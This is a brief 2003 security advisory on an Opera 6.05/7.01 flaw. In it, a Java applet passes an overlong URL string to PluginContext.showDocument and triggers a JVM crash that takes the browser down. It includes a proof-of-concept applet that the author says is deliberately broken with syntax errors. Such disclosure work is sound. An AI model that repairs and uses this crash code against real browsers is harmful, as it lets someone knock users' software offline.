These are considered ， trusted by the system policies. But they are also vulnerable against invalid ， user input. In the proof-of-concept shown below the following showDocument ， method of the PluginContext object is called with a URL object carrying a ， very long string. Executing this method , causes the call of a native method ,  ， which cannot handle the value and therefore raises a JVM crash , which then ， crashes Opera 7.01. This was observed on Windows XP and Opera 6.05/7.01 with ， Java enabled , directly calling the applet after installation. ， /Marc Schoenefeld 1/13/2003 , www.illegalaccess.org ， /not runnable , a little crippled , there are couple of obvious syntax errors ， to avoid script-kidding ， . ， . ， public class OperaCall2 extends App1et ， { ， - - public OperaCall2 (  )  ， - - { ， - - } ， - - public void paint ( Graphics g )  ， - - { ， - - PluginContext plugincontext = new PluginContext ( l )  ;  ， - - try ， - - { ， - - plugincontext.showDocument ( new URL ( \" + new ， String ( new byte [ 30000 ]  )  ;  ， - - } ， - - catch ( Exception exception )  ， - - { ， - - exception.printStackTrace (  )  ;  ， - - } ， - - } ， } ， Disclaimer ， The information in this advisory and any of its demonstrations is provided ， \"as is\" without warranty of any kind.
